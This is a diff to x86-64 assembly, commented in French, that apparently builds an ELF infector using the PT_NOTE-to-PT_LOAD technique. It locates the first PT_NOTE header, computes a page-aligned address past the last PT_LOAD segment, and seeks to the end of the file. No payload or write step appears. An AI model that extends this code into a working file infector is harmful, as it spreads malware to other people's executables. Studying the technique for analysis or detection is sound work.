@@ -13,6 +13,7 @@ section .bss
 	elfdata resb 4096
 	pt_note_sav resq 1
 	pt_load_sav resq 1
+	last_load_end resq 1
 
 	p_flags resd 1
 	p_offset resq 1
@@ -68,7 +69,8 @@ _start:
 
 boucle_proghead:
 
-	cmp rcx, [recup_phnum] 	; i >= e_phnum ?
+	movzx rdx, word [recup_phnum]
+	cmp rcx, rdx 	; i >= e_phnum ?
 	jae fin_recherche
 
 	mov rax, [recup_e_phoff] 	; RAX = e_phoff
@@ -93,14 +95,17 @@ boucle_proghead:
 
 pt_note_trouve:
 
-	mov [pt_note_sav], rax 	; RAX = position du ph dans elfdata
+	cmp qword [pt_note_sav], 0	
+	jne suite_boucle			; empecher d'écraser si il existe déjà un PT_NOTE trouvé
+
+	mov [pt_note_sav], rax		; sauvegarder le premier PT_NOTE
 
 	jmp suite_boucle
 
 
 pt_load_trouve:
 
-	mov [pt_load_sav], rax 	; RAX = position du dernier PT_LOAD dans elfdata
+	mov [pt_load_sav], rax 	; RAX = position du PT_LOAD dans elfdata
 
 	mov edx, [elfdata + rax + 4]     ; p_flags   offset +4
 	mov [p_flags], edx
@@ -117,12 +122,22 @@ pt_load_trouve:
 	mov rdx, [elfdata + rax + 40]     ; p_memsz   offset +40
 	mov [p_memsz], rdx
 
-	mov rdx, [elfdata + rax + 48]    ; p_align   offset +48
+	mov rdx, [elfdata + rax + 48]     ; p_align   offset +48
 	mov [p_align], rdx
 
 	mov rax, [p_memsz]
 	sub rax, [p_filesz]
-	mov [espace_disponible], rax	 ; espace mémoire disponible = p_memz - p_filesz
+	mov [espace_disponible], rax	 ; espace mémoire potentiellement libre
+
+	mov rax, [p_vaddr]
+	add rax, [p_filesz]
+	add rax, 0x1000			; prépare l'alignement
+	and rax, ~0xFFF			; alignement sur 0x1000
+
+	cmp rax, [last_load_end]
+	jle suite_boucle
+
+	mov [last_load_end], rax		; conserver la plus grande adresse
 
 	jmp suite_boucle
 
@@ -134,6 +149,17 @@ suite_boucle:
 
 
 fin_recherche:
+	mov r13, [last_load_end]        ; nouvelle adresse virtuelle
+	add r13, 0x1000
+	and r13, ~0xFFF
+
+	mov rax, 8
+	mov rdi, r8
+	mov rsi, 0
+	mov rdx, 2		; SEEK_END = 2
+	syscall 		; rechercher la fin du ELF
+
+	mov r12, rax		; r12 = offset de fin du fichier
 
 	mov rax, 3
 	mov rdi, r8
@@ -142,6 +168,7 @@ fin_recherche:
 	mov rax, 60
 	mov rdi, 0
 	syscall
+
 
 
 erreur:
